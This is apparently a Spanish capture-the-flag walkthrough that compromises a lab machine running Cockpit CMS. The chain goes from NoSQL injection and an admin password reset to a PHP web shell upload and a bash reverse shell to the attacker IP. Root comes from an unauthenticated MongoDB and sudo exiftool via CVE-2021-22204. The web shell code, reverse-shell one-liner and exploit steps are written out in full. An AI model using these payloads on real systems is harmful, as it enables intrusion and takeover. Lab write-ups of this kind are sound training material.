### Tags: ``NoSQL``  `RCE` ``exiftool`` ``mongo``

# Escaneo(*22, 80*)

```css
sudo nmap -p- --open -sSCV --min-rate 4000 -vvv -n -Pn <IP> -oN escaneo
```

![image](https://github.com/user-attachments/assets/7c1faa27-2654-4b6a-b92e-a3f9f62adda4)

# Port 80

Las web tiene un **panel de login**, intentamos inyecciones SQL pero nada

![image](https://github.com/user-attachments/assets/bb4c2a29-4f9e-48c0-834a-bd0bd9988ba0)

Haciendo `Ctrl + u` encontramos la versión del CMS 

![image](https://github.com/user-attachments/assets/2a0d6248-3e8d-477e-b6db-81cf6aa950da)

 Buscando en Google --> [Link](https://swarm.ptsecurity.com/rce-cockpit-cms/) encontramos que este CMS cockpit tiene algunas **vulnerabilidades** ``NoSQL`` que se pueden utilizar para volcar la **información de los usuarios**, lo que hacemos es interceptar la petición con `BurpSuite`

 ![image](https://github.com/user-attachments/assets/eca60d91-558f-4947-b6c7-2395ccc75ff0)

Ahora vemos que genera un **token CSFR** para la autenticación y podemos ver los **nombres de usuarios** usando el operador ``$func`` de la biblioteca MongoLite. 
	-Obtuvimos 4 nombres de usuarios 

![image](https://github.com/user-attachments/assets/bbe75d12-f0ef-44b6-8891-9149c4740144)

# Inyección NoSQL en */auth/resetpassword*

Ahora la funcionalidad de restablecimiento de contraseñas se realiza mediante restablecimientos de token en `/auth/resetpassword`:

![image](https://github.com/user-attachments/assets/3ef995dd-7e5d-4828-ad92-0a88bb8fe42e)

###  Compromiso de cuenta de usuario

Ahora puedo volcar las credenciales del usuario cuyo token se ha creado ingresando a `/auth/newpassword` el token:

![image](https://github.com/user-attachments/assets/9a0c494c-2c5c-4273-87c3-f122286d4d3d)

Con estos datos , ``--->`` nosotros vamos a poder cambiar la contraseña de administrador e iniciar sesión en la página de ``CMSpit``.
	1. Utilizar la aplicación con la clave API.
	2. Obtener por fuerza bruta la contraseña de la cuenta a partir del hash.
	3. Cambiar la contraseña de la cuenta utilizando el `/auth/resetpassword` método:

![image](https://github.com/user-attachments/assets/9985b0b9-fb47-45bc-bc79-3713d4fcc756)


# Dentro de la Web

Como vemos ahora estamos dentro de la web como el usuario `admin:test123`

![image](https://github.com/user-attachments/assets/e6e738ef-338f-45cf-81fe-1b4687079ba0)

## RCE

Una vez dentro de la cuenta de **administrador**, lo que podemos hacer es cargar un shell web utilizando el componente **Finder** estándar de Cockpit para conseguir la ejecución remota de código:

![image](https://github.com/user-attachments/assets/dd53676d-d49f-4f87-acbc-791a6b92676a)

Antes nos creamos este ``shell.php`` en la terminal para después subirlo

```php
<?php
        echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```

Una ves subido ponemos la `http://<ip>/shell.php?cmd=id`

![image](https://github.com/user-attachments/assets/0c1234fe-de48-4d4a-8c55-0c0ab61d18d6)

Nos mandamos una ReverseShell ---> `http://<ip>/shell.php?cmd=bash -c "bash -i >%26 /dev/tcp/<IP>/443 0>%261"`

![image](https://github.com/user-attachments/assets/6db8c1d9-a585-4adb-858a-7b293a970a52)

# Escalada (``stux``)

Con este comando `ss -ntulp`   enumero **puertos internos**  y vemos que en este puerto corre **MONGO**

![image](https://github.com/user-attachments/assets/48b814c7-fd39-43b6-bbed-5af7113e25c4)

Tratamos de conectarnos *sin proporcionar contraseña* y tuvimos éxito, ejecutando `mongo`en la terminal.

![image](https://github.com/user-attachments/assets/25c7c203-7318-4659-929f-dce49a2d1078)

Listamos las bases de datos disponibles con `show dbs`, `use sudoersbak` para acceder, `show collections;` para listar las tabas y por ultimo `db.flag.find();` para leer el contenido de la tabla.

![image](https://github.com/user-attachments/assets/cdf50aef-f631-4412-854d-59c379574357)

Encontramos la contraseña del user `stux:p4ssw0rdhack3d!123`

![image](https://github.com/user-attachments/assets/1648eddc-98df-4e7d-9a16-f8ee37b6c3be)
![image](https://github.com/user-attachments/assets/c265100a-5212-44b3-9e91-a9d19251022b)

# Escalada ``ROOT``

Haciendo `sudo -l` podemos ejecutar **exiftool** como root . ---> (me conecte por ssh como stux porque tuve que reiniciar la máquina)

![image](https://github.com/user-attachments/assets/f8dcaee5-25b1-4c3d-a121-dac6fd1ee980)

Buscando en Google de como escalar a root encontramos este [EnlaceExploit](https://github.com/convisolabs/CVE-2021-22204-exiftool), básicamente lo que tenemos que hacer es:

```ruby
git clone https://github.com/convisolabs/CVE-2021-22204-exiftool.git
cd CVE-2021-22204-exiftool
```

Una ves clonado y dentro del repo tenes que instalar esto: ``-->`` (si te llega a dar **error** como ami, hace un  `sudo apt-get update` y lo instalas)

```ruby
sudo apt install djvulibre-bin exiftool
```

Ahora lo que haces es en la terminal, **te abrís el archivito** llamado `exploit.py` y editas el script poniendo tu **IP** y el **puerto** de escucha que quieras, una ves hecho eso lo ejecutas en la terminal así:

```bash
python3 exploit.py
```

Automáticamente se te crea una imagen llamada `image.jpg`, lo que haces es transferirte esa imagen a la máquina victima de esta forma:

```bash
#máquina atacante
python3 -m http.server

#máquina víctima
wget http://<IP>/image.jpg
```

Una ves que se transfirió la imagen, abrís otra terminal para ponerte en escucha con `netcat` por el puerto especificado, ejecutas con sudo el binario:

```bash
#máquina atacnte 
nc -nlvp <puerto_especificado>

#máquina víctima
sudo /usr/local/bin/exiftool image.jpg
```

![image](https://github.com/user-attachments/assets/b7948fc2-dec3-4afe-bc7c-93767f79f074)

Y listo somos !**ROOT**!

![image](https://github.com/user-attachments/assets/2f2f323c-2c12-40e9-b24f-643865b8fe27)
















